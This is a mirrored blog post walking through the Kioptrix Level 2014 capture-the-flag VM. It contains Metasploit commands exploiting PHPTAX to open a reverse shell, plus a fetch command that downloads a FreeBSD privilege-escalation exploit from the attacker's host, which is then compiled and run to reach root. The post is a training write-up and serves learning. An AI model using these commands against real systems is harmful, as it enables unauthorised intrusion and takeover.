@@ -1,0 +1,652 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+
+<!-- Mirrored from highon.coffee/blog/kioptrix-level-2014-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 18:05:00 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<script src="https://highon.coffee/cdn-cgi/apps/head/oTwK22odZsY2CPSkVz5V2kmEjP0.js"></script><link rel="canonical" href="index.html">
+<title>Kioptrix Level 2014 Walkthrough</title>
+<meta name="description" content="Kioptrix 2014 Walkthrough, CTF solution for Kioptrix Level 2014.">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="https://highon.coffee/feed.xml">
+<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic,900">
+<link rel="stylesheet" type="text/css" href="https://highon.coffee/css/screen.css">
+<link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+<link rel="icon" type="image/x-icon" href="https://highon.coffee/favicon.ico">
+<!--[if lt IE 9]>
+  <script src="/js/html5shiv.min.js"></script>
+  <script src="/js/respond.min.js"></script>
+  <![endif]-->
+
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<h1>
+<a href="https://highon.coffee/">
+<span>HighOn.Coffee</span>
+<img src="https://highon.coffee/img/highoncoffee.png" width="300" height="115" alt="Logo">
+</a>
+</h1>
+</div>
+<nav class="main-nav unit two-thirds hide-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+</div>
+</header>
+<section class="blog">
+<div class="grid">
+<div class="docs-nav-mobile unit whole show-on-mobiles">
+<select onchange="if (this.value) window.location.href=this.value">
+<option value="">Navigate the blog…</option>
+<option value="/blog/">Home</option>
+<optgroup label="v1.x">
+<option value="/blog/penetration-testing-tools-cheat-sheet/">Penetration Testing Tools Cheat Sheet</option>
+<option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
+<option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
+<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
+<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
+<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
+<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
+<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
+<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
+<option value="/blog/vi-cheat-sheet/">Vi Cheat Sheet</option>
+<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
+<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
+<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
+<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
+<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
+<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
+<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
+<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</option>
+<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
+<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
+<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
+<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
+<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH & Meterpreter Pivoting Techniques</option>
+<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
+<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
+<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
+<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
+<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet</option>
+<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
+<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
+<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
+<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
+<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
+<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
+<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
+</optgroup>
+</select>
+</div>
+<div class="unit four-fifths">
+<article>
+<h2>
+Kioptrix Level 2014 Walkthrough
+<a href="index.html" class="permalink" title="Permalink">∞</a>
+</h2>
+<span class="post-category">
+<span class="label">
+walkthroughs
+</span>
+</span>
+<div class="post-meta">
+<span class="post-date">
+15 Apr 2014
+</span>
+<a href="https://twitter.com/Arr0way" class="post-author">
+<img src="https://github.com/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
+Arr0way
+</a>
+</div>
+<div class="post-content">
+<div class="coffee-rating">
+<table>
+<tbody>
+<tr>
+<td>
+<p><code>Coffee Difficulty Rating:</code></p>
+</td>
+<td>
+<p><i class="fa fa-coffee"></i></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul id="markdown-toc">
+<li><a href="#author-description" id="markdown-toc-author-description">Author Description</a></li>
+<li><a href="#service-enumeration" id="markdown-toc-service-enumeration">Service Enumeration</a></li>
+<li><a href="#web-application-interrogation" id="markdown-toc-web-application-interrogation">Web Application Interrogation</a></li>
+<li><a href="#non-privileged-shell" id="markdown-toc-non-privileged-shell">Non Privileged Shell</a></li>
+<li><a href="#local-privilege-escalation" id="markdown-toc-local-privilege-escalation">Local Privilege Escalation</a></li>
+</ul>
+<h2 id="author-description">Author Description</h2>
+<p>The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
+<h2 id="service-enumeration">Service Enumeration</h2>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version Detection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>TCP: 80</code></p></pc>
+</td>
+<td>
+<pc><p>HTTP</p></pc>
+</td>
+<td>
+<pc><p>Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>TCP: 8080</code></p></pc>
+</td>
+<td>
+<pc><p>HTTP</p></pc>
+</td>
+<td>
+<pc><p>Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="web-application-interrogation">Web Application Interrogation</h2>
+<p><code>http://192.168.221.159:8080/</code> rendered a page 403 forbidden page. The Firefox UserAgent switcher was leveraged to change the browser to IE 6, exposing the web application <strong>PHPTAX</strong> (this took a while to figure out!):</p>
+<p><img src="https://highon.coffee/img/blog/kioptrix/phptax.png" alt="phptax" /></p>
+<p><img src="https://highon.coffee/img/blog/kioptrix/phptax2.png" alt="phptax2" /></p>
+<h2 id="non-privileged-shell">Non Privileged Shell</h2>
+<p>Research discovered a metasploit module existed for phptax:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msf &gt; use exploit/multi/http/phptax_exec
+msf exploit<span class="o">(</span>phptax_exec<span class="o">)</span> &gt; <span class="nb">set </span>RHOST 192.168.221.159
+RHOST <span class="o">=</span>&gt; 192.168.221.159
+msf exploit<span class="o">(</span>phptax_exec<span class="o">)</span> &gt; <span class="nb">set </span>RPORT 8080
+RPORT <span class="o">=</span>&gt; 8080
+msf exploit<span class="o">(</span>phptax_exec<span class="o">)</span> &gt; <span class="nb">set </span>TARGETURI /phptax/
+TARGETURI <span class="o">=</span>&gt; /phptax/
+msf exploit<span class="o">(</span>phptax_exec<span class="o">)</span> &gt; show options
+
+Module options <span class="o">(</span>exploit/multi/http/phptax_exec<span class="o">)</span>:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
+   RHOST      192.168.221.159  yes       The target address
+   RPORT      8080             yes       The target port
+   TARGETURI  /phptax/         yes       The path to the web application
+   VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   PhpTax 0.8
+
+
+msf exploit<span class="o">(</span>phptax_exec<span class="o">)</span> &gt; run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:41] Started reverse double handler
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:41] 192.168.221.1598080 - Sending request...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:42] Accepted the first client connection...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:42] Accepted the second client connection...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:42] Accepted the first client connection...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:42] Accepted the second client connection...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:42] Command: <span class="nb">echo </span>GiSakqCyBJv7ZAuW;
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:42] Writing to socket A
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:42] Writing to socket B
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:42] Reading from sockets...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:42] Command: <span class="nb">echo </span>4yauS5V9QPhhcobv;
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:42] Writing to socket A
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:42] Writing to socket B
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:42] Reading from sockets...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:43] Reading from socket B
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:43] B: <span class="s2">"GiSakqCyBJv7ZAuW</span><span class="se">\r\n</span><span class="s2">"</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:43] Matching...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:43] A is input...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:43] Reading from socket B
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:43] B: <span class="s2">"4yauS5V9QPhhcobv</span><span class="se">\r\n</span><span class="s2">"</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:43] Matching...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>2016.01.07-08:20:43] A is input...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>192.168.221.162:4444 -&gt; 192.168.221.159:45072<span class="o">)</span> at 2016-01-07 08:20:43 -0500
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 2 opened <span class="o">(</span>192.168.221.162:4444 -&gt; 192.168.221.159:62420<span class="o">)</span> at 2016-01-07 08:20:43 -0500
+
+id
+<span class="nv">uid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span></code></pre></figure>
+<h2 id="local-privilege-escalation">Local Privilege Escalation</h2>
+<p>The binary <code>fetch</code> was used to download a FreeBSD 9.0-9.1 mmap/ptrace - Privilege Escalation Exploit, fetch was used as the target didn’t contain the usual binaries for file download (wget, curl, etc).</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">wget
+wget: not found
+
+curl
+curl: not found
+
+fetch -o exploit http://192.168.221.162:45/26368
+exploit                                               2215  B   32 MBps
+
+mv exploit exploit.c
+gcc exploit.c -o exploit
+./exploit
+
+id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>
+/bin/sh -i
+sh: can<span class="s1">'t access tty; job control turned off
+# cd /root
+# ls
+.cshrc
+.history
+.k5login
+.login
+.mysql_history
+.profile
+congrats.txt
+folderMonitor.log
+httpd-access.log
+lazyClearLog.sh
+monitor.py
+ossec-alerts.log
+# cat congrats.txt
+If you are reading this, it means you got root (or cheated).
+Congratulations either way...
+
+Hope you enjoyed this new VM of mine. As always, they are made for the beginner in
+mind, and not meant for the seasoned pentester. However this does not mean one
+can'</span>t enjoy them.
+
+As with all my VMs, besides getting <span class="s2">"root"</span> on the system, the goal is to also
+learn the basics skills needed to compromise a system. Most importantly, <span class="k">in </span>my mind,
+are information gathering &amp; research. Anyone can throw massive amounts of exploits
+and <span class="s2">"hope"</span> it works, but think about the traffic.. the logs... Best to take it
+slow, and <span class="nb">read </span>up on the information you gathered and hopefully craft better
+more targetted attacks.
+
+For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
+Knowing the OS gives you any idea of what will work and what won<span class="s1">'t from the get go.
+Default file locations are not the same on FreeBSD versus a Linux based distribution.
+Apache logs aren'</span>t <span class="k">in</span> <span class="s2">"/var/log/apache/access.log"</span>, but <span class="k">in</span> <span class="s2">"/var/log/httpd-access.log"</span>.
+It<span class="s1">'s default document root is not "/var/www/" but in "/usr/local/www/apache22/data".
+Finding and knowing these little details will greatly help during an attack. Of course
+my examples are specific for this target, but the theory applies to all systems.
+
+As a small exercise, look at the logs and see how much noise you generated. Of course
+the log results may not be accurate if you created a snapshot and reverted, but at least
+it will give you an idea. For fun, I installed "OSSEC-HIDS" and monitored a few things.
+Default settings, nothing fancy but it should'</span>ve logged a few of your attacks. Look
+at the following files:
+/root/folderMonitor.log
+/root/httpd-access.log <span class="o">(</span>softlink<span class="o">)</span>
+/root/ossec-alerts.log <span class="o">(</span>softlink<span class="o">)</span>
+
+The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified
+files <span class="k">in </span>2 specific folders. Since FreeBSD doesn<span class="s1">'t support "iNotify", I couldn'</span>t use OSSEC-HIDS
+<span class="k">for </span>this.
+The httpd-access.log is rather self-explanatory .
+Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain
+files. This one should<span class="s1">'ve detected a few of your web attacks.
+
+Feel free to explore the system and other log files to see how noisy, or silent, you were.
+And again, thank you for taking the time to download and play.
+Sincerely hope you enjoyed yourself.
+
+Be good...
+
+
+loneferret
+http://www.kioptrix.com
+
+
+p.s.: Keep in mind, for each "web attack" detected by OSSEC-HIDS, by
+default it would'</span>ve blocked your IP <span class="o">(</span>both <span class="k">in </span>hosts.allow &amp; Firewall<span class="o">)</span> <span class="k">for
+</span>600 seconds. I was nice enough to remove that part :<span class="o">)</span></code></pre></figure>
+<p>Thanks for the VM :)</p>
+</div>
+<section class="share-box">
+<div class="grid">
+<div class="unit whole">
+<div class="grid pane">
+<div class="unit whole center-on-mobiles">
+<div class="pane-content">
+<h2>Share this on...</h2>
+<p><a href="https://twitter.com/intent/tweet?text=Kioptrix%20Level%202014%20Walkthrough&amp;url=https://highon.coffee/blog/kioptrix-level-2014-walkthrough/&amp;via=Arr0way&amp;related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/kioptrix-level-2014-walkthrough/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
+<a href="https://plus.google.com/share?url=https://highon.coffee/blog/kioptrix-level-2014-walkthrough/" rel="nofollow" target="_blank" title="Share on Google+"><i class="fa fa-google-plus-square" aria-hidden="true"></i> Google+</a>
+<a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/kioptrix-level-2014-walkthrough/&amp;title=Kioptrix%20Level%202014%20Walkthrough" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>
+<h2><br>Follow Arr0way</h2>
+<p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
+<p><br></p>
+</div>
+</div>
+<h2><br>Also... <br> <br>You might want to read these</h2>
+</div>
+</div>
+</section>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Post Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../penetration-testing-tools-cheat-sheet/index.html">Penetration Testing Tools Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>kali linux</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+ </td>
+<td>
+<pc><p><b><a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../sleepy-ctf-walkthrough/index.html">/dev/random: Sleepy Walkthrough CTF</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../pipe-ctf-walkthrough/index.html">/dev/random Pipe walkthrough</a></b></p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles">
+<aside>
+<ul>
+<li class="">
+<a href="../index.html">All Blog</a>
+</li>
+<li class="">
+<a href="../cheat-sheet/index.html">Cheat Sheets</a>
+</li>
+<li class="">
+<a href="../techniques/index.html">Techniques</a>
+</li>
+<li class="">
+<a href="../security-hardening/index.html">Security Hardening</a>
+</li>
+<li class="">
+<a href="../walkthroughs/index.html">WalkThroughs</a>
+</li>
+</ul>
+<h4>Cheat Sheets</h4>
+<ul>
+<li class="">
+<a href="../penetration-testing-tools-cheat-sheet/index.html">Penetration Testing Tools Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../vi-cheat-sheet/index.html">Vi Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../systemd-cheat-sheet/index.html">Systemd Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nbtscan-cheat-sheet/index.html">nbtscan Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-commands-cheat-sheet/index.html">Linux Commands Cheat Sheet</a>
+</li>
+<li>
+<a href="../cheat-sheet/index.html">More »</a>
+</li>
+</ul>
+<h4>WalkThroughs</h4>
+<ul>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
+</li>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
+</li>
+<li class="">
+<a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a>
+</li>
+<li class="">
+<a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a>
+</li>
+<li class="">
+<a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a>
+</li>
+<li>
+<a href="../walkthroughs/index.html">More »</a>
+</li>
+</ul>
+<h4>Techniques</h4>
+<ul>
+<li class="">
+<a href="../ssh-meterpreter-pivoting-techniques/index.html">SSH & Meterpreter Pivoting Techniques</a>
+</li>
+<li>
+<a href="../techniques/index.html">More »</a>
+</li>
+</ul>
+<h4>Security Hardening</h4>
+<ul>
+<li class="">
+<a href="../security-harden-centos-7/index.html">Security Harden CentOS 7</a>
+</li>
+<li>
+<a href="../security-hardening/index.html">More »</a>
+</li>
+</ul>
+<h4>/dev/urandom</h4>
+<ul>
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li>
+<a href="../urandom/index.html">More »</a>
+</li>
+</ul>
+<h4>Other Blog</h4>
+<ul>
+<li class="">
+<a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
+</li>
+<li class="">
+<a href="../jenkins-api-unauthenticated-rce-exploit/index.html">Jenkins RCE via Unauthenticated API</a>
+</li>
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li class="">
+<a href="../enum4linux-cheat-sheet/index.html">enum4linux Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-local-enumeration-script/index.html">Linux Local Enumeration Script</a>
+</li>
+<li class="">
+<a href="../howto-install-quassel-ubuntu/index.html">HowTo Install Quassel on Ubuntu</a>
+</li>
+<li class="">
+<a href="../keepnote-macbook-install-instructions/index.html">HowTo Install KeepNote on OSX Mavericks</a>
+</li>
+
+</ul>
+</aside>
+</div>
+<div class="clear"></div>
+</div>
+</section>
+<footer>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<p>The contents of this website are &copy;&nbsp;2017 <a href="http://highon.coffee/">HighOn.Coffee</a></p>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>
+Proudly hosted by
+<img src="https://highon.coffee/img/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script>
+  var anchorForId = function (id) {
+    var anchor = document.createElement("a");
+    anchor.className = "header-link";
+    anchor.href      = "#" + id;
+    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
+    return anchor;
+  };
+
+  var linkifyAnchors = function (level, containingElement) {
+    var headers = containingElement.getElementsByTagName("h" + level);
+    for (var h = 0; h < headers.length; h++) {
+      var header = headers[h];
+
+      if (typeof header.id !== "undefined" && header.id !== "") {
+        header.appendChild(anchorForId(header.id));
+      }
+    }
+  };
+
+  document.onreadystatechange = function () {
+    if (this.readyState === "complete") {
+      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
+      if (!contentBlock) {
+        return;
+      }
+      for (var level = 1; level <= 6; level++) {
+        linkifyAnchors(level, contentBlock);
+      }
+    }
+  };
+</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-55017594-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+</body>
+
+<!-- Mirrored from highon.coffee/blog/kioptrix-level-2014-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 18:05:00 GMT -->
+</html>
